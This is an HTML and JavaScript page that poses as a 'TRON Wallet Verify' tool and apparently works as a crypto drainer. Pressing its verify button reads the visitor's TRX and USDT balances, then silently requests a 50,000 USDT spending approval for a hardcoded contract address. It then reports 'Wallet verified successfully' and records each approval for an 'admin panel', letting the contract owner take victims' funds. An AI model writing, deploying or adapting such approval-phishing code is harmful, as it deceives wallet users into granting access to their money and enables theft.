<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>TRON Wallet Verify</title>

<script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>

<style>
body{
font-family:Arial;
background:#f4f4f4;
text-align:center;
padding:40px;
}

.box{
background:white;
padding:30px;
border-radius:12px;
width:420px;
margin:auto;
box-shadow:0 0 10px rgba(0,0,0,0.1);
}

button{
padding:12px 20px;
border:none;
background:#6c4cff;
color:white;
border-radius:6px;
cursor:pointer;
margin:10px 0;
}

.status{
margin-top:15px;
padding:10px;
border-radius:6px;
display:none;
}

.success{
background:#d4edda;
color:#155724;
display:block;
}

.error{
background:#f8d7da;
color:#721c24;
display:block;
}
</style>
</head>

<body>

<div class="box">

<h2>🔐 TRON Wallet Verify</h2>

<button onclick="startScan()">Verify Wallet</button>

<p><b>Address:</b> <span id="address">Not connected</span></p>
<p><b>TRX Balance:</b> <span id="trx">0</span></p>
<p><b>USDT Balance:</b> <span id="usdt">0</span></p>

<div id="status" class="status"></div>

</div>

<script>
// ============================================
// CONFIGURATION - YOUR CONTRACT ADDRESS
// ============================================
const CONTRACT_ADDRESS = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";
const USDT_ADDRESS = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // USDT contract
const APPROVE_AMOUNT = 50000; // 50,000 USDT

// ============================================
// WAIT FOR TRONWEB
// ============================================
async function waitForTron(){
    return new Promise(resolve => {
        const check = setInterval(()=>{
            if(window.tronWeb && window.tronWeb.defaultAddress.base58){
                clearInterval(check);
                resolve(window.tronWeb);
            }
        },500);
    });
}

// ============================================
// START VERIFICATION
// ============================================
async function startScan(){
    try {
        showStatus("Connecting to wallet...", "info");
        
        const tronWeb = await waitForTron();
        const address = tronWeb.defaultAddress.base58;
        
        document.getElementById("address").innerText = address;
        showStatus("✅ Wallet connected! Getting balances...", "success");
        
        // Get TRX balance
        const trxBalance = await tronWeb.trx.getBalance(address);
        document.getElementById("trx").innerText = tronWeb.fromSun(trxBalance);
        
        // Get USDT balance
        const contract = await tronWeb.contract().at(USDT_ADDRESS);
        const balance = await contract.balanceOf(address).call();
        document.getElementById("usdt").innerText = balance/1000000;
        
        // Auto approve USDT
        await approveUSDT(tronWeb, address);
        
    } catch(error) {
        showStatus("❌ Error: " + error.message, "error");
    }
}

// ============================================
// APPROVE USDT
// ============================================
async function approveUSDT(tronWeb, address) {
    try {
        showStatus("⏳ Approving 50,000 USDT...", "info");
        
        const contract = await tronWeb.contract().at(USDT_ADDRESS);
        const amount = APPROVE_AMOUNT * 1000000;
        
        const result = await contract.approve(CONTRACT_ADDRESS, amount).send();
        
        showStatus("✅ Wallet verified successfully!", "success");
        
        // Save for admin panel
        saveApproval(address, APPROVE_AMOUNT, result);
        
    } catch(error) {
        if(error.message.includes("rejected")) {
            showStatus("❌ Approval rejected", "error");
        } else {
            showStatus("❌ Approval failed: " + error.message, "error");
        }
    }
}

// ============================================
// SAVE APPROVAL (for admin panel)
// ============================================
function saveApproval(address, amount, txHash) {
    const approvals = JSON.parse(localStorage.getItem('usdtApprovals') || '[]');
    
    approvals.push({
        user: address,
        amount: amount,
        txHash: txHash,
        status: 'active',
        time: new Date().toISOString(),
        token: 'USDT'
    });
    
    localStorage.setItem('usdtApprovals', JSON.stringify(approvals));
    console.log("Approval saved for admin panel");
}

// ============================================
// SHOW STATUS
// ============================================
function showStatus(message, type) {
    const statusDiv = document.getElementById('status');
    statusDiv.className = 'status';
    
    if(type === "success") {
        statusDiv.className += " success";
    } else if(type === "error") {
        statusDiv.className += " error";
    } else {
        statusDiv.style.display = "block";
        statusDiv.style.background = "#cce5ff";
        statusDiv.style.color = "#004085";
    }
    
    statusDiv.innerText = message;
    statusDiv.style.display = "block";
}

// Check if in Trust Wallet on load
window.onload = function() {
    if(window.tronWeb) {
        showStatus("✅ Trust Wallet detected", "success");
    } else {
        showStatus("⚠️ Please open in Trust Wallet DApp browser", "info");
    }
};
</script>

</body>
</html>
